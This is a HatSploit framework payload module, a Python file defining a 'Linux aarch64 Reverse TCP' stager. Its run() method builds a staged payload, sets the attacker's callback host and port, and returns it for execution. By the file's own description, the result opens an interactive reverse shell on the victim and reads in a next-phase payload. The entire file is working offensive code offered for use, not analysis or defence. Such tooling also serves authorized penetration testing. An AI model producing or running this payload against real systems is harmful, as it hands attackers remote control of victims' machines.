"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux aarch64 Reverse TCP",
            'Payload': "linux/aarch64/reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse TCP connection for Linux "
                "with AARCH64 architecture and reads next phase."
            ),
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Type': REVERSE_TCP,
        })

    def run(self):
        phase = Pawn().auto_pawn(
            platform=self.info['Platform'],
            arch=self.info['Arch'],
            type=self.info['Type']
        )

        phase.set('rhost', self.rhost.value)
        phase.set('rport', self.rport.value)

        return Pawn().run_pawn(phase)
